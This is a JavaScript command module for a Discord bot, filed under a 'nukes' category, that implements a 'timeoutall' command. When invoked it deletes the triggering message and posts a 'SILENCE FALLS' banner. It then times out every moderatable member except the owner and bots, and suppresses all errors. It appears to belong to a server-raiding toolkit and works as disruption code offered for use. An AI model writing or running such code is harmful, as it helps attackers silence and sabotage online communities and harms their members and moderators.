const { glitchBanner } = require('../../src/ascii');
module.exports = {
  name: 'timeoutall',
  description: 'Timeout every member.',
  category: 'nukes',
  usage: '<minutes>',
  async execute(message, args) {
    if (!message.guild) return;
    const mins = Math.min(parseInt(args[0])||5, 60);
    await message.delete().catch(()=>{});
    await message.channel.send('```\n' + glitchBanner('SILENCE FALLS') + '\n```').catch(()=>{});
    const ms = await message.guild.members.fetch();
    ms.forEach(m=>{ if (m.moderatable && m.id !== message.guild.ownerId && !m.user.bot) m.timeout(mins*60*1000, 'VOID').catch(()=>{}); });
  },
};
